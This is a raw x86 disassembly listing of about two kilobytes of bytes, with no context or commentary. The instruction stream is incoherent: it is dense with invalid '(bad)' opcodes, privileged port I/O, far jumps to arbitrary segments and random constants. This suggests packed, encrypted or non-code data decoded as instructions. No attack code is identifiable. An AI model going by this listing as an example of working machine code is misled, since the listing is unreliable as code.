  417358:	mov    ebp,0xc53de0fb
  41735d:	not    esi
  41735f:	mov    eax,0xb0472084
  417364:	push   ebp
  417366:	icebp  
  417367:	mov    al,0xfb
  417369:	outs   dx,DWORD PTR ds:[esi]
  41736a:	mov    ah,0xbb
  41736c:	jp     0x41738c
  41736e:	(bad)
  417371:	(bad)  
  417372:	jecxz  0x417388
  417374:	mov    al,0x7
  417376:	fimul  DWORD PTR [ebx]
  417378:	mov    esi,0x797180fe
  41737d:	mov    esi,0xbb32a669
  417382:	add    ah,BYTE PTR [eax]
  417384:	mov    edi,0xdf5bdfd5
  417389:	mov    eax,0x2d51485
  41738e:	(bad)  
  41738f:	ffree  st(7)
  417391:	cdq    
  417392:	lods   al,BYTE PTR ds:[esi]
  417393:	(bad)  
  417394:	fnstcw WORD PTR ds:0xd1531a40
  41739a:	fwait
  41739b:	xchg   edx,eax
  41739c:	dec    ecx
  41739d:	leave  
  41739e:	add    DWORD PTR [esi+0x4f],esi
  4173a1:	in     al,0x11
  4173a3:	xchg   edx,eax
  4173a4:	daa    
  4173a5:	popa   
  4173a6:	into   
  4173a7:	scas   al,BYTE PTR es:[edi]
  4173a8:	add    eax,0x5f8e5fc4
  4173ad:	je     0x41741f
  4173af:	movntps XMMWORD PTR [ebx-0x7b],xmm4
  4173b3:	int    0xf3
  4173b5:	in     al,0xb2
  4173b7:	(bad)  
  4173b9:	sub    eax,0x48cc6e8f
  4173be:	adc    eax,0x2164635b
  4173c3:	mov    edx,0xf71ac312
  4173c8:	jbe    0x417353
  4173ca:	ds int3 
  4173cc:	aad    0x25
  4173ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173cf:	out    dx,al
  4173d0:	or     al,0x75
  4173d2:	mov    eax,ds:0x33cdb40
  4173d7:	push   cs
  4173d8:	adc    edi,ecx
  4173da:	inc    ebp
  4173db:	lock pop edx
  4173dd:	in     al,dx
  4173de:	les    ebp,FWORD PTR [edi+esi*4+0x41bf1ffb]
  4173e5:	sbb    eax,0x9e391d9
  4173ea:	test   eax,0x55f18e4c
  4173ef:	inc    edx
  4173f0:	xchg   DWORD PTR [ecx-0x3bdc1cc5],ebp
  4173f6:	jns    0x417391
  4173f8:	pushf  
  4173f9:	mov    esi,0x374aa883
  4173fe:	and    DWORD PTR [esi-0x4],edi
  417401:	ja     0x417421
  417403:	cs push cs
  417405:	jecxz  0x417459
  417407:	xchg   ecx,eax
  417408:	jns    0x417482
  41740a:	fdiv   DWORD PTR [esp+edx*2]
  41740d:	stc    
  41740e:	jmp    0x47d018b8
  417413:	pop    esi
  417414:	mov    esp,DWORD PTR [eax]
  417416:	jae    0x4173f4
  417418:	test   BYTE PTR [eax+edi*2+0x5efc3bd2],ch
  41741f:	or     ah,BYTE PTR [esi+0xa042d9e]
  417425:	test   al,0xec
  417427:	mov    eax,0xca90854
  41742c:	es ja  0x4173f5
  41742f:	shl    BYTE PTR [esi+0x7a],cl
  417432:	sbb    DWORD PTR fs:[esi+0x42],edi
  417436:	stos   DWORD PTR es:[edi],eax
  417437:	ror    DWORD PTR [edx+0xf7110d2],0xe9
  41743e:	out    dx,al
  41743f:	inc    ebp
  417440:	fisubr DWORD PTR [ebp+0x7c525b9b]
  417446:	push   es
  417447:	adc    al,0x50
  417449:	push   cs
  41744a:	aam    0x6d
  41744c:	or     ebx,esi
  41744e:	fisttp QWORD PTR [eax-0x253f19e9]
  417454:	sub    al,0x5c
  417456:	dec    eax
  417457:	push   ebp
  417458:	jmp    0x41747c
  41745a:	jae    0x417457
  41745c:	in     al,dx
  41745d:	retf   
  41745e:	mov    eax,0x213472de
  417463:	das    
  417464:	pop    ebx
  417465:	in     al,0x7a
  417467:	xchg   ecx,eax
  417468:	scas   al,BYTE PTR es:[edi]
  417469:	or     al,0x1e
  41746b:	repz push es
  41746d:	sbb    BYTE PTR [ebx+0x2f],dl
  417470:	(bad)  
  417471:	nop
  417472:	aaa    
  417473:	pop    ecx
  417474:	fdivr  DWORD PTR [edx+0xb6b87b3]
  41747a:	in     eax,dx
  41747b:	inc    edi
  41747c:	cmp    DWORD PTR [ecx+0x2b180c94],eax
  417482:	scas   eax,DWORD PTR es:[edi]
  417483:	mov    ?,WORD PTR [edi+0x674604e7]
  417489:	enter  0xdc6c,0x40
  41748d:	addr16 clc 
  41748f:	(bad)  
  417491:	pushf  
  417492:	mov    al,0xc8
  417494:	jmp    0xf111:0x4c8a9655
  41749b:	mov    bh,0xad
  41749d:	imul   edi,DWORD PTR [edi+0x39e5bd2d],0x47c8ff21
  4174a7:	jg     0x4174f8
  4174a9:	or     al,0x9
  4174ab:	xchg   dh,bl
  4174ad:	stos   DWORD PTR es:[edi],eax
  4174ae:	mov    esi,0xdf428276
  4174b3:	mov    ch,0x7
  4174b5:	push   ds
  4174b6:	sar    DWORD PTR [ebx+0x67],cl
  4174b9:	inc    eax
  4174ba:	jle    0x417449
  4174bc:	mov    DWORD PTR [ecx-0x5f90df4f],0xfb2cc897
  4174c6:	retf   
  4174c7:	and    al,0x30
  4174c9:	cmp    dl,BYTE PTR [ecx-0x72a81fdb]
  4174cf:	jne    0x417531
  4174d1:	mov    eax,0x36bcfdae
  4174d6:	arpl   bx,bp
  4174d8:	je     0x417485
  4174da:	imul   ebp,DWORD PTR [eax],0xffffffc9
  4174dd:	dec    edi
  4174de:	mov    ?,WORD PTR [edx-0xdd3e3e5]
  4174e4:	ret    
  4174e5:	inc    esi
  4174e6:	fisttp WORD PTR [ebx+ebp*4-0x4288bf3f]
  4174ed:	or     eax,0xc27e7e2d
  4174f2:	sti    
  4174f3:	ret    0xdd49
  4174f6:	or     BYTE PTR [ebp+0x41e689e6],0x2d
  4174fd:	loop   0x417556
  4174ff:	call   FWORD PTR [edi-0x72]
  417502:	test   BYTE PTR [edi-0x13],ah
  417505:	sub    eax,0x3cd9750f
  41750a:	dec    esi
  41750b:	jmp    0x6dda0672
  417510:	std    
  417511:	jne    0x41757a
  417513:	and    DWORD PTR [ebx],edx
  417515:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  417517:	inc    eax
  417518:	inc    ebx
  417519:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41751a:	xchg   edi,eax
  41751b:	int3   
  41751c:	mov    al,0x26
  41751e:	push   0xbfb6acd6
  417523:	adc    ebx,ecx
  417525:	lock enter 0x313f,0xcb
  41752a:	nop
  41752b:	pushf  
  41752c:	xor    bl,bh
  41752e:	jne    0x417581
  417530:	jmp    0x5fccb4d9
  417535:	mov    WORD PTR [edi],ds
  417537:	in     eax,dx
  417538:	sub    al,0xaa
  41753a:	push   ebx
  41753b:	outs   dx,DWORD PTR ds:[esi]
  41753c:	inc    esp
  41753d:	xchg   ebp,eax
  41753e:	(bad)  
  41753f:	je     0x4174f0
  417541:	xchg   esp,eax
  417542:	and    al,BYTE PTR [ebp+0x2919e3b0]
  417548:	fmul   QWORD PTR [ebp+0x285ce550]
  41754e:	rol    BYTE PTR [esi+0x10],1
  417551:	mov    ecx,ebx
  417553:	aaa    
  417554:	stos   DWORD PTR es:[edi],eax
  417555:	add    dh,BYTE PTR [edi-0x3e6aff2d]
  41755b:	add    eax,0x55ce3353
  417560:	in     al,0x11
  417562:	(bad)  
  417563:	or     al,0x17
  417565:	push   es
  417566:	fwait
  417567:	rdmsr  
  417569:	lods   al,BYTE PTR gs:[esi]
  41756b:	out    dx,eax
  41756c:	pushf  
  41756d:	pop    ebx
  41756e:	inc    edx
  41756f:	repz sbb BYTE PTR [ecx+ebp*8-0x72ab1449],dh
  417577:	push   edi
  417578:	lods   al,BYTE PTR ds:[esi]
  417579:	push   0xd2c9bee9
  41757e:	and    eax,0x5906e674
  417583:	push   0xffffffa5
  417585:	jecxz  0x41754e
  417587:	inc    edx
  417588:	jae    0x4175f4
  41758a:	dec    esp
  41758b:	mov    WORD PTR [ebp+0x467d1377],gs
  417591:	cmp    cl,al
  417593:	mov    ds:0x9f086bc4,eax
  417598:	fs xor ecx,esp
  41759b:	or     esp,DWORD PTR [edi-0x543e0139]
  4175a1:	mov    bh,0x72
  4175a3:	mov    ds:0x1b7be8d6,al
  4175a8:	cmp    eax,0x4aa58e5b
  4175ad:	mov    DWORD PTR [eax],ebx
  4175af:	sbb    DWORD PTR [ecx],ecx
  4175b1:	daa    
  4175b2:	jno    0x41754d
  4175b4:	cdq    
  4175b5:	push   ecx
  4175b6:	fadd   st(0),st
  4175b8:	mov    esi,0xb9902674
  4175bd:	dec    ebp
  4175be:	pop    ss
  4175bf:	cs push cs
  4175c1:	push   edx
  4175c2:	mov    eax,0x7cbda6f7
  4175c7:	(bad)  
  4175c8:	div    DWORD PTR [edi+0x19]
  4175cb:	jle    0x4175d4
  4175cd:	xor    DWORD PTR [edx+0x5a6448f7],ebx
  4175d3:	xor    eax,0xdcb819d4
  4175d8:	jmp    0x1702:0xea1e2ac8
  4175df:	ja     0x41759b
  4175e1:	out    dx,al
  4175e2:	int    0xf4
  4175e4:	jae    0x4175e9
  4175e6:	xchg   BYTE PTR [esi+0x1],ch
  4175e9:	adc    ah,BYTE PTR ds:0xa69db522
  4175ef:	jge    0x41762a
  4175f1:	add    DWORD PTR [ebx+0x12],ecx
  4175f4:	push   ds
  4175f5:	cs fwait
  4175f7:	lahf   
  4175f8:	(bad)  
  4175f9:	jno    0x417631
  4175fb:	push   ebx
  4175fc:	push   cs
  4175fd:	adc    al,0x71
  4175ff:	es sub eax,0x75089e9f
  417605:	adc    dh,ah
  417607:	sbb    dl,BYTE PTR [edx-0x5fc6dd00]
  41760d:	enter  0x7ad4,0xf0
  417611:	dec    eax
  417612:	push   esp
  417613:	call   0x1cba:0x32869d74
  41761a:	mov    bh,0x8
  41761c:	sub    BYTE PTR [esi+0x543e3231],0x5c
  417623:	fisubr DWORD PTR [ebx+0x23fd0ea4]
  417629:	imul   edx,DWORD PTR [eax],0xe129535a
  41762f:	loope  0x41763b
  417631:	shl    DWORD PTR [edx+0x3c2fd6e0],cl
  417637:	rcr    BYTE PTR cs:[ebp-0x57],cl
  41763b:	xchg   ah,bl
  41763d:	das    
  41763e:	stc    
  41763f:	call   0x1681fdf0
  417644:	sahf   
  417645:	xchg   esi,eax
  417646:	pop    eax
  417647:	and    al,0x39
  417649:	dec    esp
  41764a:	xchg   edi,eax
  41764b:	ds int3 
  41764d:	es pop eax
  41764f:	mov    bh,BYTE PTR [ebx+edi*1]
  417652:	hlt    
  417653:	adc    bh,bh
  417655:	push   ss
  417656:	mov    ch,0x63
  417658:	mov    ecx,0x5d7ca287
  41765d:	scas   al,BYTE PTR es:[edi]
  41765e:	push   0x9b1d7bc7
  417663:	push   ebp
  417664:	test   BYTE PTR [eax],bh
  417666:	(bad)  
  417667:	cli    
  417668:	scas   eax,DWORD PTR es:[edi]
  417669:	mov    ds,WORD PTR fs:[edi+eax*8+0x1]
  41766e:	test   DWORD PTR [ecx+0x455dae51],0xa16d93d
  417678:	add    DWORD PTR [edi+0x364abb6b],ecx
  41767e:	mul    BYTE PTR [ecx-0x40]
  417681:	mov    al,0xb4
  417683:	pop    esp
  417684:	dec    ebp
  417685:	stos   DWORD PTR es:[edi],eax
  417686:	(bad)  
  417687:	push   0x1e
  417689:	nop
  41768a:	aaa    
  41768b:	mov    ebx,0x77d66cc3
  417690:	retf   0x6310
  417693:	pushf  
  417694:	inc    esi
  417695:	xchg   esi,eax
  417696:	inc    ebx
  417697:	cs test eax,0x5572bcda
  41769d:	cmp    al,0x57
  41769f:	cmp    DWORD PTR [esp+ecx*4-0x22869d3b],ecx
  4176a6:	ss sub eax,0x4352b53
  4176ac:	jae    0x417716
  4176ae:	aam    0xed
  4176b0:	in     al,0x4a
  4176b2:	jno    0x4176fe
  4176b4:	sbb    eax,DWORD PTR [eax+ebx*8-0x4]
  4176b8:	adc    edx,edx
  4176ba:	mov    bl,0x76
  4176bc:	jg     0x41772a
  4176be:	dec    ebx
  4176bf:	jmp    0x2931:0x6505e38e
  4176c6:	push   0xbe42e683
  4176cb:	xor    BYTE PTR [edx+0x2c],cl
  4176ce:	fmul   DWORD PTR [eax-0x56400bdc]
  4176d4:	mov    ch,BYTE PTR [edx-0x179e3d98]
  4176da:	pop    ds
  4176db:	push   0xad925aa5
  4176e0:	mov    BYTE PTR ds:0x5c41c00a,dl
  4176e6:	jbe    0x417717
  4176e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176e9:	inc    edx
  4176ea:	pop    ecx
  4176eb:	(bad)  
  4176ec:	clc    
  4176ed:	out    dx,al
  4176ee:	arpl   WORD PTR ds:[eax-0x4ab3bb73],dx
  4176f5:	xchg   esp,eax
  4176f6:	mov    esp,ebp
  4176f8:	dec    edx
  4176f9:	sub    dl,BYTE PTR [edi+0x5]
  4176fc:	mov    dl,0xe1
  4176fe:	mov    ebx,0xd3f4a50d
  417703:	lds    ebx,FWORD PTR ds:0x9812bdaa
  417709:	sub    edi,DWORD PTR [edx+esi*2]
  41770c:	mov    ebp,0x8b49e792
  417711:	xor    BYTE PTR [edx+esi*1],al
  417714:	mov    bh,0x89
  417716:	pusha  
  417717:	popa   
  417718:	cmp    al,0xe8
  41771a:	xor    dh,cl
  41771c:	mov    esp,0x4170f061
  417721:	cmp    cl,BYTE PTR [ebp-0x7592dfc0]
  417727:	scas   al,BYTE PTR es:[edi]
  417728:	mov    ds:0xd986ec85,al
  41772d:	aas    
  41772e:	fwait
  41772f:	in     al,dx
  417730:	repnz scas al,BYTE PTR es:[edi]
  417732:	pushf  
  417733:	popf   
  417734:	popa   
  417735:	lds    eax,FWORD PTR [esi-0x557b8ab5]
  41773b:	dec    edx
  41773c:	pop    ss
  41773d:	fisttp WORD PTR [eax+eiz*1+0x322736b5]
  417744:	hlt    
  417745:	jo     0x417795
  417747:	pop    esp
  417748:	jp     0x4177ae
  41774a:	aad    0xae
  41774c:	cmp    edx,DWORD PTR [ebp+edi*8+0x44434f2d]
  417753:	or     al,0xd6
  417755:	jae    0x417768
  417757:	pop    ebx
  417758:	call   0x636f:0xc1c100d4
  41775f:	dec    ebp
  417760:	add    dh,BYTE PTR [ebx+ebx*2-0x1ce10f6b]
  417767:	and    BYTE PTR [edx+edi*2],0x78
  41776b:	inc    esi
  41776c:	xchg   esi,eax
  41776d:	aad    0xf6
  41776f:	shl    eax,cl
  417771:	add    DWORD PTR [esi+0x7fea1f60],edx
  417777:	push   eax
  417778:	hlt    
  417779:	inc    edi
  41777a:	ds fs pushf 
  41777d:	mov    ds:0x178713c0,eax
  417782:	push   ecx
  417783:	jle    0x417762
  417785:	test   ebp,ebp
  417787:	rcr    DWORD PTR [edi+0x524d2669],0x84
  41778e:	mov    ebx,0xb110be3
  417793:	cmp    al,0xff
  417795:	cwde   
  417796:	and    al,0xca
  417798:	fstp   TBYTE PTR [ecx+0x73]
  41779b:	pop    ebx
  41779c:	pop    esp
  41779d:	xchg   esp,eax
  41779e:	stc    
  41779f:	xor    al,0xb8
  4177a1:	push   eax
  4177a2:	test   al,0xa8
  4177a4:	mov    ebp,0x8fb45473
  4177a9:	sahf   
  4177aa:	and    al,0x2d
  4177ac:	pop    ecx
  4177ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177ae:	aas    
  4177af:	out    0x52,al
  4177b1:	inc    esi
  4177b2:	jno    0x41780a
  4177b4:	mov    WORD PTR [esi-0x7f],?
  4177b7:	or     bh,0x13
  4177ba:	aas    
  4177bb:	addr16 arpl ax,bp
  4177be:	add    DWORD PTR [ebx-0xe],ebp
  4177c1:	inc    esi
  4177c2:	add    al,0x5a
  4177c4:	jns    0x4177c5
  4177c6:	int3   
  4177c7:	pop    ebx
  4177c8:	or     eax,0xd36622b
  4177cd:	jg     0x4177e8
  4177cf:	sbb    bh,0x61
  4177d2:	jg     0x4177f1
  4177d4:	pop    ebx
  4177d5:	cmc    
  4177d6:	pop    esp
  4177d7:	fisttp WORD PTR [esi-0x38]
  4177da:	cli    
  4177db:	pop    es
  4177dc:	pop    ebx
  4177dd:	cmp    al,0xa0
  4177df:	mov    BYTE PTR [edi-0x69],ch
  4177e2:	or     bh,BYTE PTR [esi]
  4177e4:	stos   DWORD PTR es:[edi],eax
  4177e5:	mov    edi,0x2eb651cf
  4177ea:	adc    BYTE PTR [ecx+0x620cfeb4],ch
  4177f0:	out    0x4a,eax
  4177f2:	cmc    
  4177f3:	les    esi,FWORD PTR [ebp+0x7f1decd3]
  4177f9:	push   ss
  4177fa:	push   edi
  4177fb:	and    DWORD PTR [ebx+0x3],ebx
  4177fe:	test   BYTE PTR [edi],0x2c
  417801:	xchg   esi,eax
  417802:	add    al,0x34
  417804:	enter  0x2fa0,0xad
  417808:	in     eax,dx
  417809:	ins    BYTE PTR es:[edi],dx
  41780a:	sub    edi,esi
  41780c:	lahf   
  41780d:	fisttp WORD PTR [ecx]
  41780f:	jle    0x417795
  417811:	test   BYTE PTR [ecx],dl
  417813:	mov    ch,0x38
  417815:	enter  0x3f5,0x9c
  417819:	ja     0x4177bc
  41781b:	out    dx,al
  41781c:	dec    ebp
  41781d:	sub    esi,DWORD PTR [edi-0x62]
  417820:	xchg   ebp,eax
  417821:	jo     0x417817
  417823:	push   0xffffffae
  417825:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417826:	sahf   
  417827:	fbstp  TBYTE PTR [esi-0x2c]
  41782a:	loope  0x4177d2
  41782c:	adc    al,0x51
  41782e:	mov    WORD PTR [ebx-0x57],?
  417831:	push   ebp
  417832:	push   ds
  417833:	and    ebp,DWORD PTR [ebp+0x11]
  417836:	outs   dx,DWORD PTR ds:[esi]
  417837:	add    ch,BYTE PTR [edx+0x73bda63a]
  41783d:	icebp  
  41783e:	lds    ecx,FWORD PTR [esp+eax*4+0x162acc1]
  417845:	push   0xffffffbf
  417847:	adc    al,0x28
  417849:	push   ss
  41784a:	cmp    ecx,ebx
  41784c:	mov    ah,0xa5
  41784e:	sbb    esi,DWORD PTR [ebx+esi*8+0x27]
  417852:	adc    ch,BYTE PTR [esp+eax*4-0x1dfea952]
  417859:	loop   0x417806
  41785b:	inc    eax
  41785c:	ins    BYTE PTR es:[edi],dx
  41785d:	sbb    esp,edi
  41785f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417860:	inc    eax
  417861:	jge    0x4178d9
  417863:	shl    DWORD PTR [esi+ebx*4-0x2a9353cf],0x1
  41786b:	xchg   ecx,eax
  41786c:	cs imul eax
  41786f:	push   ss
  417870:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417871:	mov    DWORD PTR [ecx],ecx
  417873:	(bad)  
  417874:	lock xchg ecx,eax
  417876:	inc    ebp
  417877:	into   
  417878:	les    edx,FWORD PTR [esi-0x777349ea]
  41787e:	sti    
  41787f:	je     0x417819
  417881:	dec    ecx
  417882:	inc    ebp
  417883:	frstor [esi+0x5683caa1]
  417889:	and    BYTE PTR ds:0x989852b9,bl
  41788f:	mov    ah,0x2
  417891:	jge    0x4178d5
  417893:	cmp    DWORD PTR [ebp+0x29c8b363],esp
  417899:	pusha  
  41789a:	push   0x7d62bf8c
  41789f:	mov    ch,0x7c
  4178a1:	jo     0x417848
  4178a3:	pop    esp
  4178a4:	xchg   edi,eax
  4178a5:	mov    ds:0x53fae8e8,eax
  4178aa:	mov    edx,0xcedf0e61
  4178af:	jp     0x4178d1
  4178b1:	div    DWORD PTR [eax]
  4178b3:	pop    ebp
  4178b4:	(bad)  
  4178b5:	push   DWORD PTR [ecx-0x38]
  4178b8:	mov    eax,0x9a207c56
  4178bd:	add    esi,ebp
  4178bf:	cmp    DWORD PTR [eax-0x29],esi
  4178c2:	cmp    BYTE PTR ds:0x33874cb8,ch
  4178c8:	int    0xd9
  4178ca:	pop    esi
  4178cb:	js     0x417902
  4178cd:	aad    0x34
  4178cf:	shl    BYTE PTR [edi+0x1ab896a4],1
  4178d5:	adc    DWORD PTR [edi+eax*2+0x1dd19757],ebx
  4178dc:	test   BYTE PTR [eax-0x4f01b25a],dh
  4178e2:	or     esi,ecx
  4178e4:	nop
  4178e5:	(bad)  
  4178e6:	ss cmp dl,dl
  4178e9:	jle    0x41792b
  4178eb:	shl    BYTE PTR [esi+ebp*4],cl
  4178ee:	pop    DWORD PTR [ebx]
  4178f0:	cmp    ah,ch
  4178f2:	adc    esi,DWORD PTR [ecx]
  4178f4:	ss (bad) 
  4178f6:	fsubr  QWORD PTR [edi-0x4384de5c]
  4178fc:	or     BYTE PTR [edx+0x50f3c081],ah
  417902:	adc    esi,DWORD PTR [ebx+0x1e2be5b4]
  417908:	imul   ebp,DWORD PTR [eax],0xda24bba6
  41790e:	out    0xbf,eax
  417910:	and    edi,0x22ec7445
  417916:	cmp    al,0xc3
  417918:	mov    bh,0xed
  41791a:	cmp    al,0x0
  41791c:	push   0xdd8a3ff1
  417921:	in     al,0xf5
  417923:	lahf   
  417924:	mov    ch,0xae
  417926:	xchg   DWORD PTR [ebp-0x53],edx
  417929:	sub    DWORD PTR [ebx+0x7ad3d079],ebx
  41792f:	xchg   ecx,eax
  417930:	cmp    BYTE PTR [esi+esi*1+0x503ef98a],0x7a
  417938:	mov    ds:0xdadc3736,eax
  41793d:	cmp    ecx,ecx
  41793f:	inc    eax
  417940:	sbb    cl,ah
  417942:	cmp    eax,0x790553bb
  417947:	ret    0x279a
  41794a:	mov    dl,0x53
  41794c:	cs int 0xc8
  41794f:	fucom  st(5)
  417951:	dec    esp
  417952:	dec    esi
  417953:	inc    edx
  417954:	jno    0x4178e1
  417956:	lea    edx,[esi+0x52]
  417959:	not    DWORD PTR [ecx]
  41795b:	in     eax,dx
  41795c:	jp     0x417977
  41795e:	mov    dl,0xfc
  417960:	(bad)  
  417961:	dec    eax
  417962:	xchg   ebx,eax
  417963:	in     al,0xfa
  417965:	push   cs
  417966:	(bad)  
  417967:	es dec eax
  417969:	xchg   DWORD PTR [edx-0x13b29558],esi
  41796f:	mov    ch,0xcf
  417971:	cmp    eax,0x1119985d
  417976:	cs mov dh,0x5b
  417979:	call   FWORD PTR [ecx-0xec85310]
  41797f:	rol    DWORD PTR [ebx-0x6fa848f],0x5d
  417986:	stc    
  417987:	jl     0x417931
  417989:	aas    
  41798a:	push   ss
  41798b:	jae    0x4179e4
  41798d:	push   0xffffffa9
  41798f:	mov    BYTE PTR ds:0x1a63635e,al
  417995:	test   BYTE PTR [ebx],dh
  417997:	pop    ds
  417998:	cmp    eax,DWORD PTR [edx-0x46705a76]
  41799e:	sbb    al,0xb4
  4179a0:	aaa    
  4179a1:	xlat   BYTE PTR ds:[ebx]
  4179a2:	fcmovne st,st(3)
  4179a4:	mov    edx,0x4639e432
  4179a9:	push   0x1d
  4179ab:	inc    ebp
  4179ac:	mov    al,0x9c
  4179ae:	mov    esi,0x7b8a9e37
  4179b3:	and    BYTE PTR [edi-0x65],ah
  4179b6:	inc    edi
  4179b7:	lods   eax,DWORD PTR ds:[esi]
  4179b8:	push   esi
  4179b9:	pop    esi
  4179ba:	imul   ebx,DWORD PTR [edi-0x13],0xbe0b1e87
  4179c1:	popf   
  4179c2:	and    DWORD PTR [eax],ecx
  4179c4:	xchg   ebp,eax
  4179c5:	jno    0x417984
  4179c7:	shr    cl,0x41
  4179ca:	dec    ebp
  4179cb:	jecxz  0x417a21
  4179cd:	push   ecx
  4179ce:	call   FWORD PTR [ecx]
  4179d0:	pop    eax
  4179d1:	loop   0x417a09
  4179d3:	and    eax,0x7423630a
  4179d8:	rol    al,1
  4179da:	pop    ebp
  4179db:	(bad)  
  4179dc:	aaa    
  4179dd:	dec    edi
  4179de:	mov    esi,0x59d7e1c1
  4179e3:	ss jmp 0x4179ed
  4179e6:	stos   DWORD PTR es:[edi],eax
  4179e7:	sbb    eax,0x3ded6d29
  4179ec:	mov    es,WORD PTR [ebx]
  4179ee:	cmp    eax,0x3259325f
  4179f3:	aad    0x5f
  4179f5:	aad    0xfc
  4179f7:	pop    esp
  4179f8:	sub    dh,BYTE PTR [ebx+0x7ac8d831]
  4179fe:	dec    ecx
  4179ff:	ja     0x417a21
  417a01:	and    ebp,ebp
  417a03:	aad    0xc5
  417a05:	out    dx,eax
  417a06:	(bad)  
  417a08:	in     al,0x46
  417a0a:	inc    ebp
  417a0b:	mov    al,ds:0xbe8d8711
  417a10:	cmp    dh,BYTE PTR ds:0x3bf5898c
  417a16:	push   ecx
  417a17:	inc    ecx
  417a18:	pop    ss
  417a19:	aas    
  417a1a:	xcrypt-ecb (bad)
  417a1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a1c:	dec    ebx
  417a1d:	jg     0x417a51
  417a1f:	jb     0x4179ed
  417a21:	dec    ebx
  417a22:	inc    ebx
  417a23:	pop    edi
  417a24:	add    eax,0x9b5f7b6
  417a29:	push   0x4
  417a2b:	push   esp
  417a2c:	mov    bl,0x84
  417a2e:	mov    DWORD PTR [ecx],ebp
  417a30:	adc    ebp,DWORD PTR [eax+0x73b369bf]
  417a36:	je     0x4179de
  417a38:	add    al,0x10
  417a3a:	ret    
  417a3b:	add    al,ah
  417a3d:	retf   
  417a3e:	pushf  
  417a3f:	add    BYTE PTR [edi-0x25c94514],dh
  417a45:	sub    ebx,DWORD PTR [esi-0x5451416e]
  417a4b:	mov    edx,0xd39e9c6b
  417a50:	jle    0x417aa6
  417a52:	mov    dl,0xf7
  417a54:	jg     0x417ab7
  417a56:	xor    al,0xe9
  417a58:	call   0x7f51:0xf4e526ea
  417a5f:	mov    ebp,0x5a8e3c1b
  417a64:	and    DWORD PTR [esi+0xe7c37d4],0x2b06b086
  417a6e:	sub    edi,DWORD PTR [edx]
  417a70:	daa    
  417a71:	pop    esp
  417a72:	xlat   BYTE PTR ds:[ebx]
  417a73:	(bad)  
  417a75:	popf   
  417a76:	dec    DWORD PTR [edi-0x24]
  417a79:	in     al,0x66
  417a7b:	jmp    0xc2bf:0xbaf920d3
  417a82:	push   ebx
  417a83:	enter  0xa1ed,0xb6
  417a87:	arpl   WORD PTR [edx+eax*4+0x63ede3a6],cx
  417a8e:	cmp    bl,BYTE PTR [ebp-0x6eea264f]
  417a94:	pop    ds
  417a95:	lods   al,BYTE PTR ds:[esi]
  417a96:	jg     0x417ab8
  417a98:	push   ebp
  417a99:	int    0x17
  417a9b:	in     eax,dx
  417a9c:	dec    esp
  417a9d:	adc    BYTE PTR [edi+ebx*4-0x77],ah
  417aa1:	loop   0x417b07
  417aa3:	hlt    
  417aa4:	div    DWORD PTR ds:0xedaf62f3
  417aaa:	test   ah,dh
  417aac:	jae    0x417a59
  417aae:	fwait
  417aaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ab0:	mov    esp,0x94159de8
  417ab5:	mov    ch,0x8
  417ab7:	popf   
  417ab8:	pop    es
  417ab9:	jl     0x417a7e
  417abb:	push   esp
  417abc:	loop   0x417ab3
  417abe:	test   cl,0x56
  417ac1:	enter  0xe306,0xc
  417ac5:	mov    eax,0x60350259
  417aca:	jg     0x417ad9
  417acc:	retf   0x297b
  417acf:	mov    ebx,0x2725c3e3
  417ad4:	push   0x9cff87af
  417ad9:	xor    BYTE PTR [ebx+0x60],cl
  417adc:	cmp    edi,DWORD PTR [esi-0x5625d88c]
  417ae2:	cwde   
  417ae3:	int    0x96
  417ae5:	jp     0x417b34
  417ae7:	mov    WORD PTR [edi+0x56],cs
  417aea:	xor    al,0x0
  417aec:	dec    ebp
  417aed:	cmp    al,0x99
  417aef:	sbb    DWORD PTR [ecx+0x3c],ebp
  417af2:	add    bh,BYTE PTR [edx-0x557a7b25]
  417af8:	inc    eax
  417af9:	cmp    edi,ebp
  417afb:	pop    eax
  417afc:	inc    edx
  417afd:	cld    
  417afe:	in     al,0xaf
  417b00:	retf   
  417b01:	imul   edi,DWORD PTR [edi+edi*4],0x98dd5a6e
  417b08:	cli    
  417b09:	cmp    BYTE PTR [edi-0x1b07e17a],bl
  417b0f:	adc    cl,BYTE PTR [edx+0x60db050c]
  417b15:	jl     0x417b12
  417b17:	sub    BYTE PTR [esi],0xbc
  417b1a:	jne    0x417b3b
  417b1c:	sti    
  417b1d:	mov    ecx,0x42dab5cd
  417b22:	fistp  WORD PTR gs:[esi+edi*4+0x40]
  417b27:	mov    bl,0x78
  417b29:	dec    ebx
  417b2a:	popf   
  417b2b:	sub    BYTE PTR [edi+eax*4],0x2e
  417b2f:	cmp    ah,BYTE PTR gs:[ebx+0x751ab36a]
  417b36:	mov    cl,0xb0
  417b38:	fiadd  DWORD PTR [ecx+0x47]
  417b3b:	hlt    
  417b3c:	loopne 0x417ac0
  417b3e:	mov    dh,BYTE PTR [eax]
  417b40:	lock cwde 
  417b42:	jg     0x417bb4
  417b44:	loop   0x417b60
  417b46:	enter  0x30e,0x49
  417b4a:	inc    edi
  417b4b:	mov    dh,0x97
  417b4d:	add    al,0xaf
  417b4f:	xchg   ecx,eax
  417b50:	mov    esi,0xd947a5af
  417b55:	out    dx,eax
  417b56:	es in  eax,0x95
  417b59:	test   al,0x10
  417b5b:	in     eax,0x5f
  417b5d:	mov    edi,0x1dec7fc0
  417b62:	ins    DWORD PTR es:[edi],dx
  417b63:	cld    
  417b64:	(bad)  [ebx+0x7b]
  417b67:	lds    eax,FWORD PTR [edi]
  417b69:	stos   BYTE PTR es:[edi],al
  417b6a:	mov    ah,bl
  417b6c:	dec    edi
  417b6d:	cmp    BYTE PTR [eax-0x300e7a5a],dh
  417b73:	mov    al,0xdf
  417b75:	sbb    esi,DWORD PTR [eax+0x5ac6c81a]
  417b7b:	out    dx,al
  417b7c:	repz inc eax
  417b7e:	sub    dl,ah
  417b80:	xchg   ecx,eax
  417b81:	mov    dh,BYTE PTR [ebx]
  417b83:	adc    eax,0x90972198
  417b88:	pusha  
